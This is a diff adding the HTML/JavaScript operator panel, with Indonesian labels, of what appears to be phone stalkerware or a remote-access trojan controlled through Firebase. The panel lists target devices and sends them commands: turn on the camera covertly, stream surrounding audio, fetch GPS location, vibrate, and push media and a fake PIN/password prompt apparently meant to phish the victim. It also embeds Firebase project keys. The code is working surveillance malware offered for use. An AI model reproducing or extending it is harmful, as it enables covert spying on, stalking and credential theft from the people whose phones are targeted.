@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PANEL CONTROL ADMIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <style>
+        * {margin:0; padding:0; box-sizing:border-box;}
+        body {
+            background: #0a0a0a; font-family: Arial, sans-serif; padding: 20px;
+        }
+        h1 {
+            text-align: center; color: #0f0; margin-bottom: 20px; font-size: 24px;
+        }
+        select {
+            width: 100%; padding: 15px; background: #222; color: white;
+            border: none; border-radius: 10px; font-size: 18px; margin-bottom: 20px;
+        }
+        .btn {
+            width: 100%; padding: 18px; margin: 8px 0;
+            background: linear-gradient(45deg, #222, #444); color: white;
+            border: none; border-radius: 10px; font-size: 18px; font-weight: bold;
+            cursor: pointer;
+        }
+        .btn-stop { background: linear-gradient(45deg, #8b0000, #ff0000) !important; }
+        .btn-active { background: linear-gradient(45deg, #006600, #00cc00) !important; }
+        .file-label {
+            width: 100%; padding: 15px; margin: 10px 0; background: #333;
+            color: white; border: 1px solid #555; border-radius: 10px;
+            text-align: center; display: block; font-size: 16px;
+            cursor: pointer;
+        }
+        .label { color: #0f0; font-size: 14px; margin-top: 15px; display: block; }
+        .status { text-align: center; margin-top: 20px; color: #aaa; padding: 10px; background: #111; border-radius: 10px; font-size: 16px;}
+        #liveCamBox {
+            width: 100%; height: 450px; background: #000; border: 3px solid #0f0;
+            border-radius: 15px; margin: 15px 0; display: flex; justify-content: center; align-items: center;
+        }
+        #liveCamBox img { width: 100%; height: 100%; object-fit: cover; }
+        .input-group {
+            width: 100%; padding: 15px; margin: 10px 0; background: #222;
+            border: 2px solid #555; border-radius: 10px; color: white; font-size: 16px;
+        }
+        input[type="file"] { display: none; }
+    </style>
+</head>
+<body>
+
+    <h1>PANEL CONTROL ADMIN</h1>
+
+    <select id="listTarget">
+        <option value="">-- PILIH TARGET --</option>
+    </select>
+
+    <div id="liveCamBox">
+        <span style="color:white;">Layar Video Real Time</span>
+    </div>
+
+    <button class="btn" onclick="kirimPerintah('GETAR')">GETAR HP</button>
+    <button class="btn" onclick="kirimPerintah('KAMERA')">LIVE KAMERA</button>
+    <button class="btn" onclick="kirimPerintah('STOPCAM')">STOP KAMERA</button>
+    <button class="btn" onclick="kirimPerintah('SUARA')">DENGER SUARA</button>
+    <button class="btn" onclick="cekLokasi()">LIHAT LOKASI</button>
+    <button class="btn" onclick="kirimPerintah('PLAY')">PUTAR SUARA</button>
+
+    <button class="btn btn-stop" onclick="kirimPerintah('STOP')">BERHENTIKAN SEMUA</button>
+
+    <label class="label">KIRIM FOTO:</label>
+    <label for="fileFoto" class="file-label">PILIH FILE FOTO</label>
+    <input type="file" id="fileFoto" accept="image/*">
+    <button class="btn" onclick="uploadFoto()">KIRIM FOTO</button>
+
+    <label class="label">KIRIM SUARA:</label>
+    <label for="fileSuara" class="file-label">PILIH FILE SUARA</label>
+    <input type="file" id="fileSuara" accept="audio/*">
+    <button class="btn" onclick="uploadSuara()">KIRIM SUARA</button>
+
+    <label class="label">KIRIM VIDEO:</label>
+    <label for="fileVideo" class="file-label">PILIH FILE VIDEO</label>
+    <input type="file" id="fileVideo" accept="video/*">
+    <button class="btn" onclick="uploadVideo()">KIRIM VIDEO</button>
+
+    <label class="label">KIRIM TEKS:</label>
+    <input type="text" id="pesanInput" class="input-group" placeholder="Ketik pesan disini...">
+    <button class="btn" onclick="kirimPesan()">KIRIM TEKS</button>
+
+    <label class="label">KIRIM FORM PASSWORD:</label>
+    <input type="text" id="passJudul" class="input-group" placeholder="Judul (Contoh: MASUKIN PIN)">
+    <input type="text" id="passIsi" class="input-group" placeholder="Password (Contoh: 123456)">
+    <button class="btn" onclick="kirimPassword()">KIRIM FORM PASSWORD</button>
+
+    <label class="label">NGOMONG LANGSUNG:</label>
+    <button class="btn" id="btnMic" onclick="toggleMic()">START MIC</button>
+
+    <div class="status" id="status">TERHUBUNG</div>
+
+    <script>
+        const firebaseConfig = {
+          apiKey: "AIzaSyDMNbkVP8U7W4HWbfwYTKM_k_-kJWh1b-4",
+          authDomain: "console-firebase-3c74a.firebaseapp.com",
+          databaseURL: "https://console-firebase-3c74a-default-rtdb.firebaseio.com",
+          projectId: "console-firebase-3c74a",
+          storageBucket: "console-firebase-3c74a.firebasestorage.app",
+          messagingSenderId: "957116111572",
+          appId: "1:957116111572:web:be6610ac674b7ab35ab941",
+          measurementId: "G-Y7S64164WV"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        var database = firebase.database();
+        var targetSekarang;
+        var mediaRecorder;
+        var audioChunks;
+        var isMicOn = false;
+
+        // Load Daftar HP REAL TIME
+        database.ref('devices/').on('value', function(snapshot){
+            $('#listTarget').html('<option value="">-- PILIH TARGET --</option>');
+            snapshot.forEach(function(child){
+                let key = child.key;
+                let nama = child.val().nama;
+                $('#listTarget').append('<option value="'+key+'">'+nama+'</option>');
+            });
+        });
+
+        // Tampilin Video Real Time
+        $('#listTarget').change(function(){
+            targetSekarang = $(this).val();
+            if(targetSekarang) {
+                database.ref('devices/' + targetSekarang + '/livecam').on('value', function(snap){
+                    let data = snap.val();
+                    if(data && data != "") {
+                        $('#liveCamBox').html('<img src="'+data+'">');
+                    }
+                });
+            } else {
+                $('#liveCamBox').html('<span style="color:white;">Layar Video Real Time</span>');
+            }
+        });
+
+        // ====== FUNGSI UTAMA ======
+
+        function kirimPerintah(cmd) {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            database.ref('devices/' + targetSekarang + '/perintah').set(cmd)
+            .then(() => {
+                $("#status").text("BERHASIL TERKIRIM: " + cmd);
+            })
+            .catch((error) => {
+                $("#status").text("GAGAL KIRIM: " + error.code);
+            });
+        }
+
+        function cekLokasi() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            database.ref('devices/' + targetSekarang).once('value')
+            .then((snapshot) => {
+                let lat = snapshot.val().lat;
+                let lon = snapshot.val().lon;
+                if(lat && lon) {
+                    window.open("https://www.google.com/maps?q="+lat+","+lon, "_blank");
+                    $("#status").text("LOKASI DITEMUKAN");
+                } else {
+                    $("#status").text("LOKASI BELUM ADA");
+                }
+            })
+            .catch(() => {
+                $("#status").text("GAGAL AMBIL DATA");
+            });
+        }
+
+        function kirimPesan() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            let txt = $('#pesanInput').val();
+            if(txt == "") { alert("Isi dulu teksnya!"); return; }
+            
+            database.ref('devices/' + targetSekarang + '/pesan').set(txt)
+            .then(() => {
+                $("#status").text("BERHASIL: " + txt);
+                $('#pesanInput').val('');
+            })
+            .catch(() => {
+                $("#status").text("GAGAL KIRIM TEKS");
+            });
+        }
+
+        function kirimPassword() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            let judul = $('#passJudul').val();
+            let pw = $('#passIsi').val();
+            
+            if(judul == "" || pw == "") { 
+                alert("Judul dan Password harus diisi!"); 
+                return; 
+            }
+
+            let data = judul + "|" + pw;
+            database.ref('devices/' + targetSekarang + '/password').set(data)
+            .then(() => {
+                $("#status").text("FORM PW BERHASIL DIKIRIM!");
+                $('#passJudul').val('');
+                $('#passIsi').val('');
+            })
+            .catch(() => {
+                $("#status").text("GAGAL KIRIM FORM");
+            });
+        }
+
+        function uploadFoto() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            let file = $('#fileFoto')[0].files[0];
+            if(!file) { alert("Pilih file foto dulu!"); return; }
+
+            var reader = new FileReader();
+            reader.onload = function(e) {
+                database.ref('devices/' + targetSekarang + '/foto').set(e.target.result)
+                .then(() => {
+                    $("#status").text("FOTO BERHASIL DIKIRIM!");
+                    $('#fileFoto').val('');
+                    $('.file-label[for="fileFoto"]').text('PILIH FILE FOTO');
+                })
+                .catch(() => {
+                    $("#status").text("GAGAL KIRIM FOTO");
+                });
+            }
+            reader.readAsDataURL(file);
+        }
+
+        function uploadSuara() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            let file = $('#fileSuara')[0].files[0];
+            if(!file) { alert("Pilih file suara dulu!"); return; }
+
+            var reader = new FileReader();
+            reader.onload = function(e) {
+                database.ref('devices/' + targetSekarang + '/suara').set(e.target.result)
+                .then(() => {
+                    $("#status").text("SUARA BERHASIL DIKIRIM!");
+                    $('#fileSuara').val('');
+                    $('.file-label[for="fileSuara"]').text('PILIH FILE SUARA');
+                })
+                .catch(() => {
+                    $("#status").text("GAGAL KIRIM SUARA");
+                });
+            }
+            reader.readAsDataURL(file);
+        }
+
+        function uploadVideo() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+            let file = $('#fileVideo')[0].files[0];
+            if(!file) { alert("Pilih file video dulu!"); return; }
+
+            var reader = new FileReader();
+            reader.onload = function(e) {
+                database.ref('devices/' + targetSekarang + '/video').set(e.target.result)
+                .then(() => {
+                    $("#status").text("VIDEO BERHASIL DIKIRIM!");
+                    $('#fileVideo').val('');
+                    $('.file-label[for="fileVideo"]').text('PILIH FILE VIDEO');
+                })
+                .catch(() => {
+                    $("#status").text("GAGAL KIRIM VIDEO");
+                });
+            }
+            reader.readAsDataURL(file);
+        }
+
+        // ====== FITUR DENGER SUARA SEKITAR ======
+        database.ref('devices/').on('value', function(snap){
+            if(targetSekarang && snap.val() && snap.val()[targetSekarang]){
+                let data = snap.val()[targetSekarang].suara_mic;
+                if(data) {
+                    var audio = new Audio(data);
+                    audio.play();
+                    $("#status").text("SEDANG MUTAR SUARA SEKITAR!");
+                    database.ref('devices/' + targetSekarang + '/suara_mic').remove();
+                }
+            }
+        });
+
+        // ====== FITUR MIC SENDIRI ======
+        function toggleMic() {
+            if(!targetSekarang || targetSekarang == "") { 
+                alert("PILIH TARGET DULU!"); 
+                return; 
+            }
+
+            if(!isMicOn) {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    mediaRecorder = new MediaRecorder(stream);
+                    audioChunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        const reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = function() {
+                            const base64data = reader.result;                
+                            database.ref('devices/' + targetSekarang + '/suara_admin').set(base64data)
+                            .then(() => {
+                                $("#status").text("SUARA KAMU TEREKAM & TERKIRIM!");
+                            })
+                            .catch(() => {
+                                $("#status").text("GAGAL KIRIM SUARA");
+                            });
+                        }
+                    };
+
+                    mediaRecorder.start();
+                    isMicOn = true;
+                    $('#btnMic').text('STOP MIC').addClass('btn-active');
+                    $("#status").text("MIC NYALA... NGOMONG SEKARANG!");
+                })
+                .catch(err => {
+                    $("#status").text("GAGAL AKSES MIC");
+                });
+            } else {
+                isMicOn = false;
+                mediaRecorder.stop();
+                $('#btnMic').text('START MIC').removeClass('btn-active');
+            }
+        }
+
+        // Tampilin nama file
+        $('#fileFoto').change(function(){
+            $('.file-label[for="fileFoto"]').text('FILE: ' + this.files[0].name);
+        });
+        $('#fileSuara').change(function(){
+            $('.file-label[for="fileSuara"]').text('FILE: ' + this.files[0].name);
+        });
+        $('#fileVideo').change(function(){
+            $('.file-label[for="fileVideo"]').text('FILE: ' + this.files[0].name);
+        });
+
+    </script>
+
+</body>
+</html>
+
